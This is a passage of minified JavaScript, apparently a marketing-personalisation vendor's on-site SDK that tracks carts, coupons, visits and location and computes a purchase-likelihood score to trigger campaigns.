if(cookie.indexOf("prodCats")!=-1){spApi.storageData(sQuery.trim(cookie),cookies[cookie]);sQuery.cookie(sQuery.trim(cookie),1,{expires:-1,path:'/',domain:cookieDomain});spApi.logger('info',cookie+' cookie migrated to local storage');}}catch(err){spApi.errLog(err,{logType:'migratingToLocalStorage',bugType:'product'});}}},removePageOpacity:function(){if(typeof window['insPageShow']==='function'){window['insPageShow']();}},getDataFromDataLayer:function(property,additionalCondition,fallback){var fb=typeof fallback!=='undefined'?fallback:'';var checkCondition=(typeof additionalCondition!=='undefined'&&typeof additionalCondition==='function')?additionalCondition:function(){return true;};return((typeof dataLayer!=='undefined'?dataLayer:[]).filter(function(index){return typeof index[property]!=='undefined'&&checkCondition(index);})[0]||{})[property]||fb;},getDataFromIO:function(type,property,fallback){var fb=typeof fallback!=='undefined'?fallback:'';return(typeof insider_object!=='undefined'&&typeof insider_object[type]!=='undefined'&&typeof insider_object[type][property]!=='undefined')?insider_object[type][property]:fb;},pluralForm:{get:function(lang,count,form1,form2,form3,form4){if(typeof spApi.pluralForm[lang]==='undefined'){return form1;}
return spApi.pluralForm[lang](count,form1,form2,form3,form4);},en_US:function(count,form1,form2){return Math.abs(count)==1?form1:form2;},},translations:{"en_US":{"date":{"form1":{"day":"Day","hour":"Hour","minute":"Minute","second":"Second"},"form2":{"day":"Days","hour":"Hours","minute":"Minutes","second":"Seconds"}}}},inited:false,init:function(noLog){try{if(spApi.storageType=="localStorage"){spApi.migratingToLocalStorage();}
spApi.logger('info','Api init oluyor...');if(!spApi.isBrowserSupportEnabled()){return false;}
if(!spApi.isLocalStorageSupport()){spApi.logger('info','LocalStorage Support Disabled...');return false;}
if(window.location.href.indexOf(partner_site.host)<0){spApi.logger('warning','Check your site information!');disable_camp=true;spApi.errLog({name:'siteUrlCheckFailed'},{logType:'siteUrlCheckFailed',bugType:'partner',extraData:{partnerSiteHost:partner_site.host,scriptUrl:spApi.apiUrl}});return false;}
if(!spApi.isCookieSupportEnabled()){spApi.logger('info','Cookie Support Disabled...');return false;}
if(panelEdit===true){return false;}
spApi.webPushPermission.initState();spApi.nativeOptInSDKCustomPath=false;if(spApi.localStorageGet('inLanding')==null)
spApi.storageData('inLanding',window.location.href,{path:'/',domain:cookieDomain});spApi.bounceCamp=undefined;spApi.activeCamps=[];spApi.activeInsights=[];spApi.activeWebPushes=[];spApi.activeConversionPushes={'set':[],'update':[],reset:[]};spApi.conditionCheckList=[];spApi.campCallbacks=[];spApi.userBounced=false;spApi.setAddCartCountFired=false;window.spPageVisitCount=undefined;window.esFeedData=undefined;if(noLog!==undefined){spApi.baseInit(noLog);}
else if(spApi.inited===false){function checkClickCapturingClasses(classList){return typeof classList==='string'&&(classList.indexOf('ins-category-sorting')>-1||classList.indexOf('sp-custom-')>-1||classList.indexOf('sp-goal-')>-1||classList.indexOf('insdr-insight-')>-1);}
document.addEventListener('click',function(event){for(var element=event.target;element;){var classes=element.className;if(checkClickCapturingClasses(classes)){sQuery(document).trigger('clickedElement',element);}
element=element.parentElement;}},!0);spApi.initCustomCamps(false);}
if(spApi.customizationCamps.length===0){spApi.removePageOpacity();}
function completed(){document.removeEventListener('DOMContentLoaded',completed);window.removeEventListener('load',completed);sQuery.ready();}
if(document.readyState==='complete'||(document.readyState!=='loading'&&!document.documentElement.doScroll)){window.setTimeout(sQuery.ready);}else{document.addEventListener('DOMContentLoaded',completed);window.addEventListener('load',completed);}
sQuery(document).ready(function(){if(spApi.inited===true)return false;spApi.inited=true;setTimeout(function(){spApi.baseInit(noLog);},0);});}catch(err){spApi.errLog(err,{logType:'init',bugType:'product',extraData:{param1:noLog}});}},baseInit:function(noLog){try{window.sendEsReq=true;if(typeof noLog==='undefined')
window.noLog=true;else
window.noLog=noLog
spApi.couponAsistanceShow=function(callback){if(typeof callback!="undefined"){if(!Boolean(spApi.couponAsistanceShowEvents))
spApi.couponAsistanceShowEvents=[];spApi.couponAsistanceShowEvents.push(callback);}
return this;}
spApi.triggerCartButton();spApi.initCustomCamps();spApi.getGAStyleSesId();spApi.setPushJoinLog();spApi.logger('info','Partner CSS ayarlar ekleniyor...');this.css="/*#insider-notification-content { display: none!important; }*/";if(sQuery('#insider-free-stylesheet').length==0){sQuery('body').append('<style id="insider-free-stylesheet">'+this.css+'</style>');}
this.triggerBg="52B7F1";this.triggerColor="000";if(sQuery('#insTriggerDefaultCss').length==0){sQuery('body').append('<style>'+'#spHeader {background-color:#'+this.triggerBg+' !important;}'+'#spHeader p span{color:#'+this.triggerColor+' !important;}'+'.spHeaderNav {color:#'+this.triggerColor+' !important;}'+'</style>');}
spApi.showActiveCamp();if(typeof spApi.getInsightOfThePage=='function'){spApi.getInsightOfThePage();}
if(typeof spApi.getWebPushOfThePage=='function'&&!spApi.isWebPushInitialized()&&spApi.getBrowser()!=='Safari'){spApi.getWebPushOfThePage();}
if(spApi.camps.length>0||sQuery.cookie('sp-notes')!=null){if(sQuery('#spStyleCss').length==0){if(sQuery("head link[rel='stylesheet']")[0]){sQuery("head link[rel='stylesheet']").last().after("<link id='spStyleCss' rel='stylesheet' href='//klook.api.sociaplus.com/css/sp-style.css?v=0.1' type='text/css' media='screen'>");}else{sQuery('head').append("<link id='spStyleCss' rel='stylesheet' href='//klook.api.sociaplus.com/css/sp-style.css?v=0.1' type='text/css' media='screen'>");}}}
spApi.noteTimer();spApi.setCouponAsistant();if(spApi.isOnAfterPaymentPage()){spApi.resetAddCartCount();var spRSStatus=JSON.parse(spApi.sessionStorageGet("spRSStatus"));if(spRSStatus!==null&&spRSStatus!='\"\"'&&spRSStatus!=''&&spRSStatus!==false){sQuery.post(spApi.apiUrl+"ajax.php?t=storeLog&ff",spRSStatus,function(e){spApi.sessionStorageSet("spRSStatus",JSON.stringify(false));}).done(function(){spApi.sessionStorageSet("spRSStatus",JSON.stringify(false));});}}
if(spApi.isOnCartPage())
{var initialCartAmount=spApi.getTotalCartAmount()||0;var insdrCartInterval=setInterval(function(){var changedCartAmount=spApi.getTotalCartAmount()||0;if(initialCartAmount!=changedCartAmount&&spApi.isOnCartPage()){spApi.updateCartCookies();initialCartAmount=changedCartAmount;sQuery(document).trigger('cartAmountUpdated');if(typeof spApi.cartAbandonmentEmail==='function'){spApi.cartAbandonmentEmail();}
spApi.conLog("Cart parameters have changed, updating...");spApi.conLog("Updated cart amount is: "+changedCartAmount);}},1000);var pProd=spApi.getPaidProducts();sQuery.each(pProd,function(key,value){if(pProd.length>4){pProd.pop();}});var encodedProducts=JSON.stringify(pProd);var date=new Date();var minutes=30;date.setTime(date.getTime()+(minutes*60*1000));spApi.storageData('paid-products',encodedProducts,{expires:date,path:'/',domain:cookieDomain});spApi.updateCartCount(spApi.getCartCount());}
var useCouponButton=spApi.useCouponButton();if(useCouponButton.button.length>0&&useCouponButton.button.length>0){sQuery(useCouponButton.button).live("click",function(){saveEnteredCoupon(spApi.e(useCouponButton.couponInputText));});}
function saveEnteredCoupon(enteredCoupon){var spNotes=sQuery.cookie('sp-notes');var amount=sQuery.cookie('total-cart-amount');enteredCoupon=sQuery.trim(enteredCoupon);if(spNotes!=null){spNotes=spNotes.split("|");notes=JSON.parse(spNotes[1]);if(notes[enteredCoupon]!=undefined&&notes[enteredCoupon].length>0){var data={};data.type="real-sales-log";data.campId="0";data.referer=enteredCoupon+"%7C-%7C"+amount;data.ref=window.document.referrer;spApi.sessionStorageSet("spRSStatus",JSON.stringify(data));}}}
if(spApi.isOnCartPage()){total=spApi.getTotalCartAmount();var encodedProducts=sQuery.toJSON(spApi.getPaidProducts());sQuery.cookie('total-cart-amount',total,{expires:1,path:'/',domain:cookieDomain});}
var showOtherCamps=true;if(spApi.isOnAfterPaymentPage()){spApi.setSaLog();if(spApi.activeCamp){var total=sQuery.cookie('total-cart-amount');var paidProducts=spApi.storageData('paid-products');if(paidProducts)
{paidProducts=JSON.parse(paidProducts);var total=parseFloat(total);var min=parseFloat(activeCamp.purMinOrderAmount);if(paidProducts.length&&min<=total)
{showOtherCamps=false;spApi.showCamp(spApi.activeCamp);}}}}
if(showOtherCamps)
{}
if(spApi.isOnProductPage()){}
if(spApi.isOnProductPage()||spApi.isOnCartPage()){sQuery.cookie('current-currency',spApi.getCurrency(),{expires:1,path:'/',domain:cookieDomain});}
if(typeof spApi.widgets=="undefined")
spApi['widgets']={};spApi.insdrPrefix=function(a){a=a.replace(/(([.#]))+/g,function(p){return p.replace('.','.insdr_').replace('#','#insdr_');});return a;};spApi.stripInsdr=function(a){a=a.replace(/(([.#insdr_]))+/g,function(p){return p.replace('.insdr_','.').replace('#insdr_','#');});return a;};var insiderLoadScript=function(url,callback){var script=document.createElement('script');script.type='text/javascript';if(script.readyState){script.onreadystatechange=function(){if(script.readyState=='loaded'||script.readyState=='complete'){script.onreadystatechange=null;if('function'===typeof callback){callback();}}};}else{script.onload=function(){if('function'===typeof callback){callback();}};}
script.src=url;document.getElementsByTagName('head')[0].appendChild(script);}
spApi.showCrowdyNotification=function(camp){esCountAnalytics(function(count){if(typeof esLiveFeed!=="object"&&typeof esLiveFeed!=="undefined"){esLiveFeed(function(purchaseData){try{var isReturn=false;if(spApi.notifies[camp.id].kkbSettings!==null){sQuery.each(spApi.notifies[camp.id].kkbSettings,function(i,val){if(spApi.notifies[camp.id].content.indexOf(i)>-1){if(i=="@dailyView"&&count.dailyView<=val){isReturn=true;}
if(i=="@instantView"&&count.instantView<=val){isReturn=true;}
if(i=="@dailyPurchase"&&purchaseData.purchase.dailyPurchase<=val){isReturn=true;}
if(i=="@inBasketCount"&&purchaseData.inBasketCount<=val){isReturn=true;}}});}
if(isReturn){return;}
var crowdyWrapper=sQuery('<div/>',{'class':'ins-crowdy-wrap ins-crowdy-wrap-'+camp.id,'style':'visibility: hidden; display: none;'});var urlParams='';var crowdyIframe=sQuery('<iframe/>',{'class':'sp-crowdy-iframe sp-crowdy-iframe-'+camp.id,'src':spApi.frameUrl+"?viewType=1&id="+camp.id+"&appType=28"+"&pageUrl="+spApi.urlencode(window.location.href)+urlParams,'frameBorder':'0'});sQuery('body').append(crowdyWrapper);sQuery('.ins-crowdy-wrap-'+camp.id).append(crowdyIframe);sQuery('.sp-crowdy-iframe-'+camp.id).on('load',function(){sQuery('.sp-crowdy-iframe-'+camp.id).pm(function(data){sQuery('#insider-notification-content').html(function(index,html){return html.replace(/@dailyView/g,data.count.dailyView).replace(/@dailyView/g,data.count.dailyView);});sQuery('#insider-notification-content').html(function(index,html){return html.replace(/@instantView/g,data.count.instantView).replace(/@instantView/g,data.count.instantView);});sQuery('#insider-notification-content').html(function(index,html){return html.replace(/@dailyPurchase/g,data.purchase.purchase.dailyPurchase).replace(/@dailyPurchase/g,data.purchase.purchase.dailyPurchase);});sQuery('#insider-notification-content').html(function(index,html){return html.replace(/@inBasketCount/g,data.purchase.inBasketCount).replace(/@inBasketCount/g,data.purchase.inBasketCount);});sQuery('#insider-notification-content').html(function(index,html){return html.replace(/@dailyPurchase/g,data.purchase.purchase.dailyPurchase).replace(/@dailyPurchase/g,data.purchase.purchase.dailyPurchase);});sQuery('#insider-notification-content').html(function(index,html){return html.replace(/@inBasketCount/g,data.purchase.inBasketCount).replace(/@inBasketCount/g,data.purchase.inBasketCount);});var spApiUserData=data.spApiUserData;var insiderObject=data.insiderObject;var checkUserDataOld=typeof spApiUserData!=="undefined"&&typeof spApiUserData.name!=="undefined"
var checkUserDataNew=typeof insiderObject!=="undefined"&&typeof(insiderObject.user||[]).name!=="undefined"
var userName=false;if(checkUserDataOld){userName=spApiUserData.name;}
if(checkUserDataNew){userName=insiderObject.user.name;}
if(userName!=false){sQuery('#insider-notification-content').html(function(index,html){return html.replace(/@userName/g,userName).replace(/@userName/g,userName);});}
sQuery('.element-close-button').live('click',function(){sQuery(window).pm(function(data){sQuery('.ins-crowdy-wrap-'+data.campId).remove();},undefined,{campId:data.campId});});return iframeConfig;},function(config){var cssConfig=JSON.parse(config.cssConfig);var locationConfig=JSON.parse(config.locationConfig);var effectConfig=JSON.parse(config.effectConfig);var allConfig={cssConfig:cssConfig,locationConfig:locationConfig,effectConfig:effectConfig};var location={positionLeft:Number(locationConfig.left),positionTop:Number(locationConfig.top),positionType:Number(locationConfig.type),position:locationConfig.position,spWindowWidth:Number(locationConfig.windowWidth),spWindowHeight:Number(locationConfig.windowHeight),selectedElement:locationConfig.selectedElement};var position=spApi.getPositionOfTheCamp(location,cssConfig,2);sQuery('body').append('<style>'+'.ins-crowdy-wrap-'+camp.id+' { width: '+cssConfig.width+'px !important; height: '+cssConfig.height+'px !important; }'+'.ins-crowdy-wrap-'+camp.id+' { left: '+position.positionLeft+'px !important; top: '+position.positionTop+'px !important; position: '+position.spFixed+' !important; z-index: 999999; }'+'.sp-crowdy-iframe { width: 100%; height:100%; border-radius: '+cssConfig.borderRadius+' !important; border-width: '+cssConfig.borderWidth+' !important; border-style: '+cssConfig.borderStyle+' !important; border-color: '+cssConfig.borderColor+' !important; -webkit-box-sizing: border-box !important; -moz-box-sizing: border-box !important; box-sizing: border-box !important; }'+'</style>');if(!spApi.isControlCamp(camp.id)){sQuery('.ins-crowdy-wrap-'+camp.id).css({"display":"inline-block","visibility":"visible"});}
sQuery('.sp-crowdy-iframe-'+camp.id).css({"display":"block","visibility":"visible"}).promise().done(function(){var effectConfig=spApi.notifies[camp.id].effectConfig;if(typeof effectConfig!=='object'){effectConfig=JSON.parse(effectConfig);}
if(effectConfig instanceof Object){if(typeof effectConfig.open!="undefined"){sQuery('.ins-crowdy-wrap-'+camp.id).effective(effectConfig.open);}}
var logData={key:'sp-camp-'+camp.id,obj:{'step1-displayed':true},campId:camp.id};spApi.updateCookie(logData);spApi.bindAutoClose(camp);sQuery.each(camp.callbacks.show,function(key,callback){spApi.campEventControl('show',callback);});});},{count:count,purchase:purchaseData,campId:camp.id,spApiUserData:typeof spApiUserData!=="undefined"?spApiUserData:[],insiderObject:typeof insider_object!=="undefined"?insider_object:[]});});}catch(err){spApi.errLog(err,{logType:'showCrowdyNotification',bugType:'product',extraData:{}});}});}},camp.id);}}catch(err){spApi.errLog(err,{logType:'baseInit',bugType:'partner',extraData:{noLog:noLog}});}},setVersusSalesLog:function(orderId){try{spApi.logger('info','setVersusSalesLog ile versus sat loglar atlyor... ');var vStorage='insdr-widget-versus-';if(spApi.storageData(vStorage+'A')!=null||spApi.storageData(vStorage+'B')!=null){var storageName=spApi.storageData(vStorage+'A')!=null?vStorage+'A':vStorage+'B';var cContent=spApi.storageData(storageName);if(cContent!="1"){cContent=JSON.parse(cContent);if(cContent['step1-displayed']){var versusInitLoop=setInterval(function(){var versus=spApi.widgets.versus;var logger=(typeof versus!=='undefined'?versus.logging:false);if(logger!==false){logger.sendSalesLog(orderId);clearInterval(versusInitLoop);}},100);}}}}catch(err){spApi.errLog(err,{logType:'setVersusSalesLog',bugType:'product',extraData:{orderID:orderId}});}},isset:function(value){return typeof value!=='undefined'&&typeof value!=='unknown';},checkSearchKeyword:function(browser,skeyword){var keyword='';switch(browser){case'Google':if(document.referrer.indexOf('q=')>-1)
keyword=document.referrer.split('q=')[1].split('&')[0];else
keyword='';break;case'Yahoo':if(document.referrer.indexOf('p=')>-1)
keyword=document.referrer.split('p=')[1].split('&')[0];else
keyword='';break;case'Yandex':if(document.referrer.indexOf('text=')>-1)
keyword=document.referrer.split('text=')[1].split('&')[0];else
keyword='';break;case'Bing':if(document.referrer.indexOf('q=')>-1)
keyword=document.referrer.split('q=')[1].split('&')[0];else
keyword='';break;}
return decodeURI(keyword)===skeyword;},checkMemberStatus:function(status){if(status=='logged'){return spApi.esQ.memberStatus.dCount>=1;}
if(status=='notlogged'){return spApi.esQ.memberStatus.dCount<1;}},lastSiteVisitCheck:function(targetCamp,logic,howManyDay){var oldDate=spApi.esQ.lastSiteVisitAggr.value;var today=parseInt(new Date()/1000);return spApi.e('(spApi.dateDifferenceCheck(today,oldDate,\'day\') '+logic+' howManyDay)');},lastPageVisitCheck:function(targetCamp,logic,howManyDay,uid){var oldDate=spApi.esQ['lastPageVisitDateAggr_'+uid].value;var today=parseInt(new Date()/1000);return spApi.e('(parseInt(spApi.dateDifferenceCheck(today,oldDate)) '+logic+' howManyDay)');},isFirstPageVisitCheck:function(targetCamp,logic,howManyDay,uid){var oldDate=spApi.esQ['lastPageVisitDateAggr_'+uid].value;var today=parseInt(new Date()/1000);return spApi.dateDifferenceCheck(today,oldDate,'second')<0;},averagePageTimeCheck:function(targetCamp,variable,logic,tType,uid){var val=spApi.esQ['averagePageTimeAggr__'+uid].value;var _temp=0;switch(tType){case'second':_temp=val*1;break;case'minute':_temp=val/60;case'hour':_temp=(val/60)/60;}
return spApi.e('(variable '+logic+' temp)');},averageSiteTimeCheck:function(targetCamp,variable,logic,tType){var val=spApi.esQ['averageSiteTimeAggr'].value;var _temp=0;switch(tType){case'second':_temp=val*1;break;case'minute':_temp=val/60;break;case'hour':_temp=(val/60)/60;break;}
return spApi.e('( _temp '+logic+' variable )');},checkPageViewCount:function(targetCamp,logic,howMany,uid){var val=spApi.esQ['pageViewCountAggr_'+uid].dCount;return spApi.e('(val '+logic+' '+howMany+')');},checkTotalVisitCount:function(targetCamp,logic,howMany){var val=spApi.esQ['totalVisitAggr'].dCount;return spApi.e('(val '+logic+' '+howMany+')');},checkVisitFrequency:function(targetCamp,logic,howMany,uid){var val=spApi.esQ['visitFrequencyAggr_'+uid].dCount;return spApi.e('(val '+logic+' '+howMany+')');},getPastCartAmount:function(logic,price,sStatus,uid){if(sStatus=='sale'){if(spApi.esQ['success_'+uid].dCount==spApi.esQ['cart_'+uid].dCount){return spApi.e('(spApi.esQ[\'success_\'+uid].value '+logic+' '+price+')');}else{return false;}}else if(sStatus=='not-sale'){if(spApi.esQ['success_'+uid].dCount!=spApi.esQ['cart_'+uid].dCount){return spApi.e('(spApi.esQ[\'cart_\'+uid].value '+logic+' '+price+')');}
else{return false;}}},getPastCartProductCount:function(logic,c,sStatus,uid){if(sStatus=='sale'){if(spApi.esQ['success_'+uid].dCount==spApi.esQ['cart_'+uid].dCount){return spApi.e('(spApi.esQ[\'success_\'+uid].dCount '+logic+' '+c+')');}else{return false;}}else if(sStatus=='not-sale'){if(spApi.esQ['success_'+uid].dCount!=spApi.esQ['cart_'+uid].dCount){return spApi.e('(spApi.esQ[\'cart_\'+uid].value '+logic+' '+c+')');}
else{return false;}}},getPastSuccessAmount:function(logic,price,uid){var val=spApi.esQ['sellAmountAggr_'+uid].value;return spApi.e('(price '+logic+' val)');},getPastSuccessCount:function(logic,c,uid){var val=spApi.esQ['sellAmountAggr_'+uid].dCount;return spApi.e('(price '+logic+' val)');},isDirectAccess:function(){return document.referrer==='';},convertNumberToBoolean:function(n){return n>0;},checkReferrerData:function(searchKey){if(!spApi.isDirectAccess()){return document.referrer.indexOf(searchKey)>=0;}else{return false;}},checkParameterData:function(searchKey){if(window.inLanding===undefined){if(JSON.parse(spApi.localStorageGet('inLanding')).data.indexOf(searchKey)>-1){window.inLanding=true;return true;}
else{return sQuery.cookie('landingFlag')=='true';}}else{if(spApi.localStorageGet('inLanding')!=null&&sQuery.cookie('landingFlag')==null){if(JSON.parse(spApi.localStorageGet('inLanding')).data.indexOf(searchKey)>-1){sQuery.cookie('landingFlag','true',{path:'/',domain:'.'+partner_site.host});return true;}else{return false;}}else{if(sQuery.cookie('landingFlag')=='true'){return true;}}}},dateDifferenceCheck:function(date1,date2,dType){var result=0;if(date2===0){date2=date1;}
switch(dType){case'hour':result=((date1-date2)/60)/60;break;case'day':result=(((date1-date2)/60)/60)/24;break;case'second':result=(date1-date2);break;}
return result;},checkUserIp:function(ip){if(spApi.storageData('userLocation')!=null){var parseIpData=sQuery.parseJSON(spApi.storageData('userLocation'));return parseIpData.request===ip;}
return false;},checkOS:function(targetOs){var ua=navigator.userAgent;var uaindex;var mobileOS='x';if(ua.match(/iPad/i)||ua.match(/iPhone/i)){mobileOS='Ios';uaindex=ua.indexOf('OS ');}
else if(ua.match(/Android/i)){mobileOS='Android';uaindex=ua.indexOf('Android ');}
if(mobileOS==='iOS'&&uaindex>-1){mobileOSver=ua.substr(uaindex+3,3).replace('_','.');}
else if(mobileOS==='Android'&&uaindex>-1){mobileOSver=ua.substr(uaindex+8,3);}
if((ua.match(/Windows/i)||ua.match(/windows/i))&&mobileOS=='x'){mobileOS='Windows';uaindex=ua.indexOf('OS ');}
if((ua.match(/Mac/i)||ua.match(/mac/i))&&mobileOS=='x'){mobileOS='Mac';uaindex=ua.indexOf('OS ');}
if((ua.match(/Linux/i)||ua.match(/Linux/i))&&mobileOS=='x'){mobileOS='Linux';uaindex=ua.indexOf('OS ');}
return mobileOS===targetOs;},checkBrowser:function(targetBrowser){return targetBrowser===spApi.getBrowser();},checkCampSit:function(sitType,campId){try{var J=JSON.parse(spApi.storageData('sp-camp-'+campId));}catch(err){return false;}
switch(sitType){case'preview':return!!(J!=null&&J['step1-displayed']);break;case'notpreview':return J==null||!J['step1-displayed'];break;case'join':return!!(J!=null&&(J.liked||J.joined));break;case'previewNotjoin':return!!(J!=null&&J['step1-displayed']&&(!J.liked||!J.joined));break;case'closed':return!!(J!=null&&J['closed']);break;case'previewNotClosed':return!!(J!=null&&J['step1-displayed']&&!J['closed']);break;}},checkResolution:function(sign,dataset){var dataset=spApi.e('dataset='+dataset+';');var sHeight=screen.height;var sWidth=screen.width;var res=spApi.e('( '+sWidth+' '+sign+' '+dataset.width+' )&&( '+sHeight+' '+sign+' '+dataset.height+')');return res;},checkLocation:function(country,city){if(spApi.storageData('userLocation')!=null){var userLocation=JSON.parse(spApi.storageData('userLocation'));if(userLocation.country!=null&&userLocation.country!='null'){try{city=JSON.parse(city)}catch(e){spApi.logger('info','City is not a json object');}
var status=false;if(country.indexOf('/')>-1){var countryCodes=country.split('/');sQuery.each(countryCodes,function(index,val){if(val.trim()===userLocation.country){if(typeof city==='object'){sQuery.each(city,function(index,cityVal){if(cityVal==userLocation.geoId||cityVal==userLocation.city){status=true;}});}else if(city==='all'||city==userLocation.geoId||city==userLocation.city){status=true;}}});}else if(country==userLocation.country){if(typeof city==='object'){sQuery.each(city,function(index,cityVal){if(cityVal==userLocation.geoId||cityVal==userLocation.city){status=true;}});}else if(city=='all'||city==userLocation.geoId||city==userLocation.city){status=true;}}
return status;}}},checkAdvancedJs:function(type,param,logic){if(typeof spApiUserData!='undefined'){return spApi.e('(param '+logic+' spApiUserData[0][type])');}},checkCustomDataset:function(cookieKey,segmentName){try{var cookie=sQuery.cookie(cookieKey);if(cookie!=null){var key='customDataSet-'+segmentName;var customSet=JSON.parse(localStorage.getItem(key));if(customSet&&typeof customSet=='object'){return Boolean(customSet.status);}}
return false;}catch(err){spApi.errLog(err,{logType:'checkCustomDataset',bugType:'product'});return false;}},assertThresholdExceeded:function(campId){var self={};var coeff=spApi.coeff;var storageName={session:'insCoeffSession',weekly:'insCoeffWeekly'};var coeffHolder={session:{count:{main:0,product:0,cat:0,cart:0,total:0},landing:{active:'',main:0,product:0,cat:0,cart:0,other:0},duration:{session:0,product:0,longProduct:0,fTimeSession:0,fTimeProduct:0,fTimeLongProduct:0},totalProductPrices:0,productPrices:[],systemHour:new Date().getHours(),searchKeywords:'',mobileBrowser:Number(spApi.isMobileBrowser())||0,cartAmount:0,visitedProducts:[],theSameProduct:0},weekly:{today:0,count:{main:0,product:0,cat:0,cart:0,total:0,session:0,lastSession:0,productSession:0,totalSession:0},landing:{main:0,product:0,cat:0,cart:0,other:0},duration:{session:0,lastSession:0}}};var coeffSession=JSON.parse(spApi.storageData(storageName.session))||(spApi.storageData(storageName.session,coeffHolder.session),JSON.parse(spApi.storageData(storageName.session)));var coeffWeekly=JSON.parse(spApi.storageData(storageName.weekly))||(spApi.storageData(storageName.weekly,coeffHolder.weekly),JSON.parse(spApi.storageData(storageName.weekly)));self.setCoeff=function(){Object.keys(self.helper.coeffHelperFunctions).forEach(function(func){if(typeof self.helper.coeffHelperFunctions[func]==='function'){self.helper.coeffHelperFunctions[func].call();}});self.push(1,Number(coeffSession.cartAmount>0));self.push(2,coeffSession.count.total);self.push(3,coeffSession.theSameProduct);self.push(4,coeffSession.count.cart);self.push(5,coeffSession.mobileBrowser);self.push(6,coeffSession.landing.product);self.push(7,coeffSession.landing.cat);self.push(8,coeffSession.landing.main);self.push(9,coeffSession.landing.cart);self.push(10,(coeffSession.searchKeywords.length>0?1:0));self.push(11,Number(coeffSession.systemHour<=14&&coeffSession.systemHour>=7));self.push(12,Number(coeffSession.systemHour>14&&coeffSession.systemHour<=22));var f13=parseFloat(((coeffSession.duration.session/coeffSession.count.total)||0).toFixed(2));self.push(13,f13);self.push(14,coeffSession.count.cat);self.push(15,coeffSession.count.product);if(coeff.v==='3.0'){var f16Value=spApi.checkPredictiveAmountData(7,'in last','purchaseCount','undefined','undefined',0,'>');var f16=Number(f16Value===true);self.push(16,f16);var currentDate=new Date();var lastSevenDays=Math.round(currentDate.setDate(currentDate.getDate()-7)/1000);var lastOneMonth=Math.round(currentDate.setDate(currentDate.getDate()-30)/1000);var f17Value=spApi.checkPredictiveAmountData('','between','purchaseCount',lastOneMonth,lastSevenDays,0,'>');var f17=Number(f17Value===true);self.push(17,f17);}
if(coeff.v>='4.0'){var f18=0
if(coeffSession.productPrices.length){f18=coeffSession.totalProductPrices/coeffSession.productPrices.length}
self.push(18,f18);var f19=0;if(coeffSession.duration.product){f19=coeffSession.duration.longProduct/coeffSession.duration.product;}
self.push(19,f19);var f20=0;if(coeffSession.count.total){f20=coeffSession.count.cat/coeffSession.count.total;}
self.push(20,f20);var f21=(coeffSession.count.total&&(coeffSession.count.cart/coeffSession.count.total))||0;self.push(21,f21);var f22=(coeffSession.count.total&&(coeffSession.count.product/coeffSession.count.total))||0;self.push(22,f22);self.push(23,coeffWeekly.landing.cat);self.push(24,coeffWeekly.landing.main);self.push(25,coeffWeekly.landing.product);self.push(26,coeffWeekly.landing.cart);self.push(27,coeffWeekly.duration.session);self.push(28,coeffWeekly.count.product);self.push(29,coeffWeekly.count.session);var pData=JSON.parse(spApi.storageData('predictiveData')||'[]');var lSDate=new Date(pData['last_visit_date']);var diff=((new Date().getTime()-lSDate.getTime()))/1000;var f30=Math.floor(diff/(60*60*24))||0;self.push(30,f30);self.push(31,coeffWeekly.today);}
spApi.storageData(storageName.session,coeffSession);spApi.storageData(storageName.weekly,coeffWeekly,{expires:7});};self.run=function(){if(!coeff.v){spApi.logger('warning','There is no coefficient version.',campId);return false;}
if(coeff.v>='4.1'){if(spApi.isMobileBrowser()){coeff.f=coeff.fMobile;coeff.i=coeff.iMobile;}else{coeff.f=coeff.fWeb;coeff.i=coeff.iWeb;}}
if(Object.keys(coeff.f).length===0){spApi.logger('warning','There is no coefficients.',campId);return false;}
if(typeof spApi.sessionInit==='undefined'){spApi.getGAStyleSesId();}
if(spApi.sessionInit){spApi.storageData(storageName.session,coeffHolder.session);coeffSession=coeffHolder.session;}
if(typeof spApi.coeff.run==='undefined'){spApi.reInitOnChangeCallbacks.push(function(){spApi.coeff.run=undefined;spApi.logger('info','spApi.coeff.run set to undefined on reInitOnChange');});spApi.coeff.run=true;self.setCoeff();}
var value=0;var assert_coeff=true;var c,f,t=spApi.isMobileBrowser()?coeff.tMobile:coeff.t;Object.keys(coeff.f).forEach(function(key){c=parseFloat(coeff.f[key][0])||0;f=parseFloat(coeff.f[key][1])||0;value=value+(c*f);if(c==null||f==null||t==null)
assert_coeff=false;});if(!assert_coeff){spApi.logger('warning','null coefficient values: '+JSON.stringify(spApi.coeff),campId);return false;}
value=value+parseFloat(coeff.i);value=1/(1+Math.pow(Math.E,-1*value));var threshold=parseFloat(t);if(spApi.debugModeIsOpen()){spApi.coeff.score=value;}
spApi.logger('warning','value: '+value+', threshold:'+threshold,campId);if(value>threshold){return{coeff:coeff,value:value,threshold:threshold};}
return false;};self.push=function(order,value){return coeff.f[order]=[coeff.f[order][0],value];};self.helper={evalRule:function(t){switch(t){default:return false;case'main':return spApi.isOnMainPage()||false;case'product':return spApi.isOnProductPage()||false;case'cat':return spApi.isOnCategoryPage()||false;case'cart':return spApi.isOnCartPage()||false;case'camount':return parseFloat(spApi.getTotalCartAmount())||parseFloat(sQuery.cookie('total-cart-amount'))||0;case'mobile':return spApi.isMobileBrowser();}},getPageType:function(){if(spApi.isOnMainPage())
return'main';if(spApi.isOnProductPage())
return'product';if(spApi.isOnCategoryPage())
return'cat';if(spApi.isOnCartPage())
return'cart';return'other';},coeffHelperFunctions:{checkCartAmount:function(){coeffSession.cartAmount=parseFloat(spApi.getCartCount())||parseFloat(spApi.getTotalCartAmount())||parseFloat(sQuery.cookie('total-cart-amount'))||0;},checkVisits:function(){if(spApi.storageData('ins-today-sId')===null){spApi.storageData('ins-today-sId',sQuery.cookie('ins-gaSSId'),{expires:1});}else{if(spApi.storageData('ins-today-sId')!==sQuery.cookie('ins-gaSSId')){coeffWeekly.today=1;}}},searchKeywords:function(){coeffSession.searchKeywords=coeffSession.searchKeywords||spApi.getSearchKeyWords()||'';},productPrices:function(){if(self.helper.evalRule('product')&&spApi.getCurrentProduct().price){coeffSession.totalProductPrices+=parseFloat(spApi.getCurrentProduct().price);coeffSession.productPrices.push(parseFloat(spApi.getCurrentProduct().price));}},visitedProducts:function(){if(self.helper.evalRule('product')){var id=spApi.getCurrentProduct().id;if(coeffSession.visitedProducts.indexOf(id)===-1){id!==null&&coeffSession.visitedProducts.push(id);}else{coeffSession.theSameProduct=1;}}},landingType:function(){if(!coeffSession.landing.active){var 